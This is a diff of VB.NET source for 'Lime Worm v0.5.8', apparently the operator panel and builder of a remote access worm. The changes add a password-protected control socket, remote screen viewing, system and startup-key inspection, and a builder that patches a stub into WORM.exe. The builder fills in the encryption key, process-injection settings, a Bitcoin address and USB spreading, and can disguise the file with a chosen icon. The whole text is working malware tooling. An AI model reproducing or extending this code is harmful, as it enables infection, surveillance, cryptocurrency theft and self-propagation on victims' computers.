@@ -1,6 +1,6 @@
 ﻿
 '##################################################################
-'##        N Y A N   C A T  |||   Updated on May./05/2018        ##
+'##        N Y A N   C A T  |||   Updated on May./07/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -19,7 +19,7 @@
 '##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
 '##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
 '##                                                              ##
-'##                     .. Lime Worm v0.5.7 ..                   ##
+'##                     .. Lime Worm v0.5.8 ..                   ##
 '##                                                              ##
 '##                                                              ##
 '##                                                              ##
@@ -41,11 +41,12 @@ Imports Mono.Cecil
 Imports Mono.Cecil.Cil
 
 Public Class Form1
-    Public WithEvents S As Listner
+    Public WithEvents S As S_Socket
     Public SPL As String = "|'L'|"
     Private m_SortingColumn As ColumnHeader
     Public Shared F As Form1
     Public Shared MYPORT As Integer
+    Public Shared MYPASS As String = String.Empty
     Public Shared MYIP As String = String.Empty
 
 
@@ -83,31 +84,52 @@ Public Class Form1
 
     End Sub
     Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
-        NotifyIcon1.Dispose()
-        Application.Exit()
-        End
+        My.Settings.Save()
+        Try
+            NotifyIcon1.Dispose()
+            Application.Exit()
+            End
+        Catch : End Try
     End Sub
 
     Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Me.Load
         Control.CheckForIllegalCrossThreadCalls = False
-        ContextMenuStrip1.Renderer = New MyRenderer()
+#If DEBUG Then
+
+        MYPORT = 8989
+        MYPASS = "NYANCAT"
         Try
-            MYPORT = InputBox("Hello " + Environment.UserName + " , Select Port", "", My.Settings.port)
-            If Not MYPORT = Nothing Then
-                S = New Listner(MYPORT)
+            S = New S_Socket(MYPORT)
+        Catch ex As Exception
+            MsgBox(ex.Message)
+            End
+        End Try
+#Else
+
+        Try
+re:
+            MYPORT = InputBox("Select Port", "", My.Settings.port)
+            MYPASS = InputBox("Select Password", "", My.Settings.pass)
+            If Not MYPASS = String.Empty Then
+                S = New S_Socket(MYPORT)
                 My.Settings.port = MYPORT
+                My.Settings.pass = MYPASS
+            Else
+                GoTo re
             End If
         Catch ex As Exception
             MsgBox(ex.Message)
             End
         End Try
-
+#End If
         BackgroundWorker1.RunWorkerAsync()
     End Sub
 
     Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
 
-        Me.Text = "Lime Worm v0.5.7"
+        ContextMenuStrip1.Renderer = New MyRenderer()
+
+        Me.Text = "Lime Worm v0.5.8"
 
         If ToolStripStatusLabel2.Text.Contains("OFF") Then
             ToolStripStatusLabel2.ForeColor = Color.Red
@@ -117,15 +139,16 @@ Public Class Form1
         PATH1.Enabled = False
         DROP.Checked = False
         PATH2.Enabled = False
+        Injection_CHK.Enabled = False
 
         Dim Client As TcpClient = Nothing
         Try
             Client = New TcpClient
             Client.Connect(GetExternalAddress, MYPORT)
-            ToolStripStatusLabel3.Text = "LISTENING [" & GetExternalAddress() & " @ " & MYPORT & "]"
+            ToolStripStatusLabel3.Text = "LISTENING [" & GetExternalAddress() & " @" & MYPORT & " #" & MYPASS & "]"
             ToolStripStatusLabel3.ForeColor = Color.Lime
         Catch ex As SocketException
-            ToolStripStatusLabel3.Text = "CLOSED [" & GetExternalAddress() & " @ " & MYPORT & "]"
+            ToolStripStatusLabel3.Text = "CLOSED [" & GetExternalAddress() & "  @" & MYPORT & "  #" & MYPASS & "]"
             ToolStripStatusLabel3.ForeColor = Color.Red
         Finally
             Client.Close()
@@ -148,11 +171,12 @@ Public Class Form1
     End Sub
 
     Private Sub S_Connected(ByVal u As USER) Handles S.Connected
+
     End Sub
-    Private Shared _Gio As New GIO(Application.StartupPath & "\GIO.dat")
+    Private Shared _Gio As New S_GIO(Application.StartupPath & "\GIO.dat")
     Delegate Sub _Data(ByVal u As USER, ByVal b() As Byte)
     Private Sub S_Data(ByVal u As USER, ByVal b() As Byte) Handles S.Data
-        Dim A As String() = Split(AES_Decrypt(BS(b)), SPL)
+        Dim A As String() = Split(S_Encryption.AES_Decrypt(BS(b)), SPL)
 
         Try
             Select Case A(0)
@@ -211,15 +235,15 @@ Public Class Form1
                         Exit Sub
                     End If
 
-                    Dim Cap As Cap = My.Application.OpenForms("!" + u.IP.Split(":")(0))
+                    Dim _RDP As RDP = My.Application.OpenForms("!" + u.IP.Split(":")(0))
 
-                    If Cap Is Nothing Then
-                        Cap = New Cap
-                        Cap.F = Me
-                        Cap.u = u
-                        Cap.Name = "!" + u.IP.Split(":")(0)
-                        Cap.Sz = New Size(A(1), A(2))
-                        Cap.Show()
+                    If _RDP Is Nothing Then
+                        _RDP = New RDP
+                        _RDP.F = Me
+                        _RDP.u = u
+                        _RDP.Name = "!" + u.IP.Split(":")(0)
+                        _RDP.Sz = New Size(A(1), A(2))
+                        _RDP.Show()
                     End If
 
                 Case "@" ' i recive image  
@@ -227,15 +251,15 @@ Public Class Form1
                         Me.Invoke(New _Data(AddressOf S_Data), u, b)
                         Exit Sub
                     End If
-                    Dim Cap As Cap = My.Application.OpenForms("!" + u.IP.Split(":")(0))
-                    If Cap IsNot Nothing Then
+                    Dim _RDP As RDP = My.Application.OpenForms("!" + u.IP.Split(":")(0))
+                    If _RDP IsNot Nothing Then
                         If A(1).Length = 1 Then
-                            If Cap.Button1.Text = "Stop" Then
-                                S.Send(u, "@" & SPL & Cap.C1.SelectedIndex & SPL & Cap.C2 & SPL & Cap.C.Value)
+                            If _RDP.Button1.Text = "Stop" Then
+                                S.Send(u, "@" & SPL & _RDP.C1.SelectedIndex & SPL & _RDP.C2 & SPL & _RDP.C.Value)
                             End If
                             Exit Sub
                         End If
-                        Cap.PktToImage(SB(A(1)))
+                        _RDP.PktToImage(SB(A(1)))
                     End If
 
                 Case "MSG"
@@ -392,9 +416,9 @@ Public Class Form1
                         Exit Sub
                     End If
 
-                    Dim n As Info = My.Application.OpenForms("Info" + u.IP.Split(":")(0))
+                    Dim n As SysInfo = My.Application.OpenForms("Info" + u.IP.Split(":")(0))
                     If n Is Nothing Then
-                        n = New Info
+                        n = New SysInfo
                         n.F = Me
                         n.U = u
                         n.Name = "Info" + u.IP.Split(":")(0)
@@ -468,7 +492,7 @@ Public Class Form1
                         Me.Invoke(New _Data(AddressOf S_Data), u, b)
                         Exit Sub
                     End If
-                    Dim n As Info = My.Application.OpenForms("Info" + u.IP.Split(":")(0))
+                    Dim n As SysInfo = My.Application.OpenForms("Info" + u.IP.Split(":")(0))
                     If n IsNot Nothing Then
 
                         Try
@@ -512,7 +536,7 @@ Public Class Form1
                         Me.Invoke(New _Data(AddressOf S_Data), u, b)
                         Exit Sub
                     End If
-                    Dim n As Info = My.Application.OpenForms("Info" + u.IP.Split(":")(0))
+                    Dim n As SysInfo = My.Application.OpenForms("Info" + u.IP.Split(":")(0))
                     If n IsNot Nothing Then
                         Dim G1 As New ListViewGroup("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\", HorizontalAlignment.Left)
                         Dim G2 As New ListViewGroup("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\", HorizontalAlignment.Left)
@@ -1122,8 +1146,12 @@ Public Class Form1
                 EXE.Text = EXE.Text + ".exe"
             End If
 
-            If (PATH2.Text = "") Then
-                PATH2.Text = Nothing
+            If PATH2.Text = "" Then
+                PATH2.Text = String.Empty
+            End If
+
+            If Not PATH2.Text.StartsWith("\") AndAlso Not PATH2.Text = String.Empty Then
+                PATH2.Text = "\" + PATH2.Text
             End If
 
             If Not IO.File.Exists((Application.StartupPath & "\Stub\stub.exe")) Then
@@ -1155,14 +1183,32 @@ Public Class Form1
                                                 If (str = "%EXE%") Then
                                                     current.Operand = EXE.Text
                                                 End If
-                                                If (str = "%DROP%") Then
-                                                    current.Operand = DROP.Checked.ToString
+                                                If (str = "%SPL%") Then
+                                                    current.Operand = SPL.ToString
                                                 End If
+                                                If (str = "%KEY%") Then
+                                                    current.Operand = BS(Convert.FromBase64String(S_Socket.KEY.ToString))
+                                                End If
+                                                If (str = "%PASS%") Then
+                                                    current.Operand = MYPASS.ToString
+                                                End If
+                                                If (str = "%DROP%") Then
+                                                        current.Operand = DROP.Checked.ToString
+                                                    End If
                                                 If (str = "%PATH1%") Then
                                                     current.Operand = PATH1.Text
                                                 End If
                                                 If (str = "%PATH2%") Then
                                                     current.Operand = PATH2.Text
+                                                End If
+                                                If (str = "%INJ_NAME%") Then
+                                                    current.Operand = Injection_Name.Text
+                                                End If
+                                                If (str = "%INJ_CHK%") Then
+                                                    current.Operand = Injection_CHK.Checked.ToString
+                                                End If
+                                                If (str = "%BTC_ADDR%") Then
+                                                    current.Operand = BTC_ADDR.Text
                                                 End If
                                                 If (str = "%USB%") Then
                                                     current.Operand = USB_CHK.Checked.ToString
@@ -1185,7 +1231,7 @@ Public Class Form1
 
                     definition.Write(Application.StartupPath + "\" + "WORM.exe")
                     If Icon_OFF.Checked = True AndAlso Icon_Box.ImageLocation <> "" Then
-                        Iconchanger.InjectIcon(Application.StartupPath + "\" + "WORM.exe", Icon_Box.ImageLocation)
+                        S_Iconchanger.InjectIcon(Application.StartupPath + "\" + "WORM.exe", Icon_Box.ImageLocation)
                     End If
                     MsgBox("Your Worm Has been Created Successfully", vbInformation, "DONE!")
                     My.Settings.Save()
@@ -1202,10 +1248,12 @@ Public Class Form1
             EXE.Enabled = True
             PATH1.Enabled = True
             PATH2.Enabled = True
+            Injection_CHK.Enabled = True
         Else
             EXE.Enabled = False
             PATH1.Enabled = False
             PATH2.Enabled = False
+            Injection_CHK.Enabled = False
         End If
     End Sub
 
